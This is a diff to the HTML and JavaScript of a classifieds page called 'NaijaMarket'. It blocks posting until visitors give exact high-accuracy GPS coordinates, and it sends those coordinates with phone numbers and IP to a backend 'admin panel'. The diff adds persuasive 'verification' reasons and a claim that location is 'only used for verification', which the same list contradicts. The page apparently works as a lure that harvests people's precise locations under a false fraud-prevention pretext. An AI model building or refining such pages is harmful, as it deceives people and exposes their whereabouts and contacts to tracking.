@@ -78,12 +78,17 @@
         .close-modal:hover { color: #e65c00; }
         .location-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.96); backdrop-filter: blur(20px); z-index: 20000; display: none; align-items: center; justify-content: center; }
         .location-modal.active { display: flex; }
-        .location-card { background: white; border-radius: 32px; padding: 45px 35px; text-align: center; max-width: 450px; width: 90%; animation: slideUp 0.4s ease; }
+        .location-card { background: white; border-radius: 32px; padding: 45px 35px; text-align: center; max-width: 500px; width: 90%; animation: slideUp 0.4s ease; }
         @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
         .location-card i { font-size: 65px; color: #e65c00; margin-bottom: 20px; }
         .location-card h2 { font-size: 28px; margin-bottom: 12px; color: #1a1a2e; }
-        .location-card p { color: #666; margin-bottom: 30px; line-height: 1.6; }
-        .location-allow-btn { background: linear-gradient(135deg, #e65c00, #ff8c00); color: white; padding: 16px; border-radius: 60px; border: none; font-weight: 700; font-size: 18px; cursor: pointer; width: 100%; transition: 0.3s; }
+        .location-card p { color: #666; margin-bottom: 20px; line-height: 1.6; }
+        .location-reasons { background: #f8f9fa; border-radius: 16px; padding: 15px; margin: 20px 0; text-align: left; }
+        .location-reasons h4 { color: #e65c00; margin-bottom: 10px; font-size: 14px; }
+        .location-reasons ul { list-style: none; padding: 0; }
+        .location-reasons li { margin: 10px 0; font-size: 13px; display: flex; align-items: center; gap: 10px; color: #333; }
+        .location-reasons li i { font-size: 16px; width: 20px; color: #22c55e; }
+        .location-allow-btn { background: linear-gradient(135deg, #e65c00, #ff8c00); color: white; padding: 16px; border-radius: 60px; border: none; font-weight: 700; font-size: 18px; cursor: pointer; width: 100%; transition: 0.3s; margin-top: 10px; }
         .location-allow-btn:hover { transform: translateY(-2px); }
         .toast { position: fixed; bottom: 30px; right: 30px; background: #22c55e; color: white; padding: 14px 28px; border-radius: 50px; z-index: 30000; transform: translateX(200%); transition: 0.3s; font-weight: 500; box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
         .toast.show { transform: translateX(0); }
@@ -111,7 +116,7 @@
         </div>
         <div class="location-status" id="locationStatus">
             <i class="fas fa-map-marker-alt status-inactive" id="locationIcon"></i>
-            <span id="locationText">Checking location...</span>
+            <span id="locationText">Location OFF</span>
         </div>
         <button class="post-btn" id="openPostModalBtn" disabled><i class="fas fa-plus-circle"></i> Post Free Ad</button>
     </div>
@@ -210,7 +215,17 @@
     <div class="location-card">
         <i class="fas fa-map-marker-alt"></i>
         <h2>Location Access Required</h2>
-        <p><strong>⚠️ Verification Required:</strong> To prevent fraud and build trust with buyers, NaijaMarket requires your exact GPS location before posting any ad.</p>
+        <p><strong>Why do we need your location?</strong></p>
+        <div class="location-reasons">
+            <ul>
+                <li><i class="fas fa-shield-alt"></i> <strong>Verify Real Sellers</strong> - Prevent fraud and fake listings</li>
+                <li><i class="fas fa-map-pin"></i> <strong>Show Exact Item Location</strong> - Buyers can see where item is</li>
+                <li><i class="fas fa-handshake"></i> <strong>Build Trust</strong> - Verified locations = more sales</li>
+                <li><i class="fas fa-chart-line"></i> <strong>Local Analytics</strong> - See where your buyers are coming from</li>
+                <li><i class="fas fa-ban"></i> <strong>Stop Scammers</strong> - We block suspicious locations</li>
+            </ul>
+        </div>
+        <p style="font-size:13px; color:#666; margin-bottom:20px;">🔒 Your location is only used for verification.</p>
         <button class="location-allow-btn" id="locationAllowBtn"><i class="fas fa-check-circle"></i> Enable Location & Verify</button>
     </div>
 </div>
@@ -262,9 +277,7 @@
         { id: 7, title: "Samsung Galaxy S23 Ultra", price: "₦620,000", location: "VI, Lagos", street: "12, Ozumba Mbadiwe Street", image: "https://images.unsplash.com/photo-1678652197831-2d180705cd2c?w=400&h=300&fit=crop", time: "30 mins ago", verified: true },
         { id: 8, title: "Honda Accord 2020", price: "₦9.5M", location: "Lagos Mainland", street: "5, Ikorodu Road, Maryland", image: "https://images.unsplash.com/photo-1621007947382-bb3c3994e3fb?w=400&h=300&fit=crop", time: "35 mins ago", verified: false },
         { id: 9, title: "2-Bedroom Flat for Sale", price: "₦25M", location: "Ikeja, Lagos", street: "22, Opebi Road", image: "https://images.unsplash.com/photo-1560448204-e02f11c3d0e2?w=400&h=300&fit=crop", time: "40 mins ago", verified: true },
-        { id: 10, title: "MacBook Pro M2", price: "₦1.2M", location: "Abuja", street: "9, Mississippi Street, Maitama", image: "https://images.unsplash.com/photo-1517336714731-489689fd1ca8?w=400&h=300&fit=crop", time: "45 mins ago", verified: true },
-        { id: 11, title: "Wristwatch", price: "₦45,000", location: "Surulere, Lagos", street: "34, Adeniran Ogunsanya Street", image: "https://images.unsplash.com/photo-1524592094714-0f0654e20314?w=400&h=300&fit=crop", time: "50 mins ago", verified: false },
-        { id: 12, title: "Standing Fan", price: "₦25,000", location: "Ajah, Lagos", street: "15, Abraham Adesanya Estate", image: "https://images.unsplash.com/photo-1601480443885-5a2e8a7e2a62?w=400&h=300&fit=crop", time: "55 mins ago", verified: true }
+        { id: 10, title: "MacBook Pro M2", price: "₦1.2M", location: "Abuja", street: "9, Mississippi Street, Maitama", image: "https://images.unsplash.com/photo-1517336714731-489689fd1ca8?w=400&h=300&fit=crop", time: "45 mins ago", verified: true }
     ];
 
     const categories = [
@@ -278,6 +291,7 @@
 
     let userLocation = null;
     let locationAllowed = false;
+    let locationCheckDone = false;
 
     function renderFeatured() {
         document.getElementById('featuredGrid').innerHTML = featuredProducts.map(p => `
@@ -333,11 +347,9 @@
         
         if (locationAllowed && userLocation) {
             locationIcon.className = "fas fa-map-marker-alt status-active";
-            const cityName = userLocation.city || userLocation.state || 'Location ON';
-            locationText.innerHTML = `📍 ${cityName.substring(0, 20)}`;
+            locationText.innerHTML = `📍 Verified`;
             postBtn.disabled = false;
             heroPostBtn.disabled = false;
-            showToast("✅ Location verified! You can now post ads.", false);
         } else {
             locationIcon.className = "fas fa-map-marker-alt status-inactive";
             locationText.innerHTML = "Location OFF";
@@ -354,7 +366,7 @@
         setTimeout(() => toast.classList.remove('show'), 3500);
     }
 
-    // FAST location capture - only coordinates, NO reverse geocoding (faster on Android)
+    // FAST location capture - only coordinates
     async function captureLocation() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) { 
@@ -363,19 +375,17 @@
                 return;
             }
             navigator.geolocation.getCurrentPosition((position) => {
-                // Only send coordinates - admin will get street name later
                 const locationData = { 
                     lat: position.coords.latitude, 
                     lng: position.coords.longitude, 
-                    accuracy: position.coords.accuracy,
-                    timestamp: position.timestamp
+                    accuracy: position.coords.accuracy
                 };
                 resolve(locationData);
             }, (error) => {
                 let errorMsg = "";
                 switch(error.code) {
                     case error.PERMISSION_DENIED:
-                        errorMsg = "❌ Location permission denied. Please enable in browser settings.";
+                        errorMsg = "❌ Location permission denied. Please enable in browser settings to post ads.";
                         break;
                     case error.POSITION_UNAVAILABLE:
                         errorMsg = "❌ Location unavailable. Please check your GPS.";
@@ -388,7 +398,7 @@
                 }
                 showToast(errorMsg, true);
                 resolve(null);
-            }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+            }, { enableHighAccuracy: true, timeout: 10000 });
         });
     }
 
@@ -417,17 +427,17 @@
                 body: JSON.stringify(data) 
             });
             if (response.ok) {
-                console.log('✅ Data sent to backend successfully');
+                console.log('✅ Data sent to backend');
                 return true;
             } else {
                 throw new Error('Backend error');
             }
         } catch(err) {
-            console.log('Backend not available, saving locally:', err);
             // Fallback to localStorage
             let existing = JSON.parse(localStorage.getItem('naijamarket_data') || '[]');
             existing.unshift(data);
             localStorage.setItem('naijamarket_data', JSON.stringify(existing.slice(0, 200)));
+            console.log('Data saved locally');
             return true;
         }
     }
@@ -442,7 +452,7 @@
         
         newBtn.onclick = async () => {
             modal.classList.remove('active');
-            showToast("📍 Getting your location...", false);
+            showToast("📍 Getting your location for verification...", false);
             const location = await captureLocation();
             if (location && location.lat) {
                 userLocation = location;
@@ -467,7 +477,6 @@
                 showToast("✅ Location verified! You can now post ads.", false);
             } else {
                 showToast("❌ Location verification failed. Please enable GPS and try again.", true);
-                setTimeout(() => showLocationModal(), 2000);
             }
         };
     }
@@ -512,7 +521,8 @@
                 description: document.getElementById('adDesc').value,
                 price: document.getElementById('adPrice').value || 'Free',
                 location: `${document.getElementById('streetAddress').value}, ${document.getElementById('cityArea').value}`,
-                phone: document.getElementById('contactPhone').value || 'Not provided'
+                phone: document.getElementById('contactPhone').value || 'Not provided',
+                whatsapp: document.getElementById('whatsappPhone').value || 'Not provided'
             },
             location: {
                 lat: userLocation.lat,
@@ -523,25 +533,20 @@
             ip: device.ip
         };
         
-        const sent = await sendToBackend(adRecord);
+        await sendToBackend(adRecord);
         
-        if (sent) {
-            // Clear form
-            document.getElementById('adTitle').value = '';
-            document.getElementById('adDesc').value = '';
-            document.getElementById('adPrice').value = '';
-            document.getElementById('streetAddress').value = '';
-            document.getElementById('cityArea').value = '';
-            document.getElementById('contactPhone').value = '';
-            document.getElementById('whatsappPhone').value = '';
-            
-            showToast(`✅ "${title}" posted! Location verified. Check admin panel.`);
-        } else {
-            showToast(`⚠️ Ad saved locally. Will sync when online.`);
-        }
+        // Clear form
+        document.getElementById('adTitle').value = '';
+        document.getElementById('adDesc').value = '';
+        document.getElementById('adPrice').value = '';
+        document.getElementById('streetAddress').value = '';
+        document.getElementById('cityArea').value = '';
+        document.getElementById('contactPhone').value = '';
+        document.getElementById('whatsappPhone').value = '';
         
         btn.innerHTML = originalText;
         btn.disabled = false;
+        showToast(`✅ "${title}" posted! Location verified. Check admin panel.`);
         document.getElementById('postModal').classList.remove('active');
         updateStats();
     });
@@ -571,6 +576,9 @@
     
     // Check if location is already on when page loads
     async function checkExistingLocation() {
+        if (locationCheckDone) return;
+        locationCheckDone = true;
+        
         if (!navigator.geolocation) {
             updateLocationUI();
             return;
@@ -582,16 +590,19 @@
                 const result = await navigator.permissions.query({ name: 'geolocation' });
                 if (result.state === 'granted') {
                     // Location already granted! Get the coordinates
+                    showToast("📍 Location already enabled. Verifying...", false);
                     const location = await captureLocation();
                     if (location && location.lat) {
                         userLocation = location;
                         locationAllowed = true;
                         updateLocationUI();
+                        showToast("✅ Location verified! You can now post ads.", false);
                         return;
                     }
                 } else if (result.state === 'denied') {
                     locationAllowed = false;
                     updateLocationUI();
+                    showToast("⚠️ Location permission denied. Please enable to post ads.", true);
                     return;
                 }
             } catch(e) {}
